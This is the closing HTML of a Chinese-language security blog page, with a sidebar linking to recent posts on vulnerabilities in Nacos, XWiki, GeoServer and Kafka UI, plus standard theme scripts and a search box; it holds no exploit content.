onerror="this.onerror=null;this.src='/img/404.png'" alt="网传的nacos 0day"/></a><div class="content"><a class="title" href="/2024/07/15/7%E6%9C%8815%E6%97%A5%E7%BD%91%E4%BC%A0%E7%9A%84nacos-0day/" title="网传的nacos 0day">网传的nacos 0day</a><time datetime="2024-07-15T13:40:12.000Z" title="发表于 2024-07-15 21:40:12">2024-07-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/05/CVE-2024-31982-XWiki-DatabaseSearch-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="CVE-2024-31982 XWiki DatabaseSearch 远程代码执行漏洞"><img src="https://raw.githubusercontent.com/todis21/image/main/2024/wallhaven-yxo2eg_1920x1080.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CVE-2024-31982 XWiki DatabaseSearch 远程代码执行漏洞"/></a><div class="content"><a class="title" href="/2024/07/05/CVE-2024-31982-XWiki-DatabaseSearch-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="CVE-2024-31982 XWiki DatabaseSearch 远程代码执行漏洞">CVE-2024-31982 XWiki DatabaseSearch 远程代码执行漏洞</a><time datetime="2024-07-05T06:44:15.000Z" title="发表于 2024-07-05 14:44:15">2024-07-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/03/CVE-2024-36401-GeoServer-XPath-rce/" title="CVE-2024-36401 GeoServer XPath rce"><img src="https://raw.githubusercontent.com/todis21/image/main/202304031628382.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CVE-2024-36401 GeoServer XPath rce"/></a><div class="content"><a class="title" href="/2024/07/03/CVE-2024-36401-GeoServer-XPath-rce/" title="CVE-2024-36401 GeoServer XPath rce">CVE-2024-36401 GeoServer XPath rce</a><time datetime="2024-07-03T03:41:52.000Z" title="发表于 2024-07-03 11:41:52">2024-07-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/26/Apache-Kafka-UI-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Apache Kafka UI 远程代码执行漏洞分析"><img src="https://raw.githubusercontent.com/todis21/image/main/2024/wallhaven-x6gyyv_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Apache Kafka UI 远程代码执行漏洞分析"/></a><div class="content"><a class="title" href="/2024/06/26/Apache-Kafka-UI-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Apache Kafka UI 远程代码执行漏洞分析">Apache Kafka UI 远程代码执行漏洞分析</a><time datetime="2024-06-26T06:44:32.000Z" title="发表于 2024-06-26 14:44:32">2024-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/01/Frida%E5%AD%A6%E4%B9%A0/" title="Frida学习"><img src="https://w.wallhaven.cc/full/76/wallhaven-76e1mv.jpg" onerror="this.onerror=null;this.src='/img/404.png'" alt="Frida学习"/></a><div class="content"><a class="title" href="/2024/04/01/Frida%E5%AD%A6%E4%B9%A0/" title="Frida学习">Frida学习</a><time datetime="2024-04-01T09:38:31.000Z" title="发表于 2024-04-01 17:38:31">2024-04-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Tree</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><script type="text/javascript" id="maid-script" src="https://unpkg.com/mermaid@undefined/dist/mermaid.min.js?v=undefined"></script><script>if (window.mermaid) {
  var options = JSON.parse(document.getElementById('maid-script').getAttribute('mermaidoptioins'));
  mermaid.initialize(options);
}</script></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
  if ($mermaid.length === 0) return
  const runMermaid = () => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    Array.from($mermaid).forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
      const mermaidID = 'mermaid-' + index
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)

      const renderV10 = () => {
        renderFn.then(({svg}) => {
          mermaidSrc.insertAdjacentHTML('afterend', svg)
        })
      }

      const renderV9 = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
    })
  }

  const loadMermaid = () => {
    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
  }

  btf.addModeChange('mermaid', runMermaid)

  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="喵" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>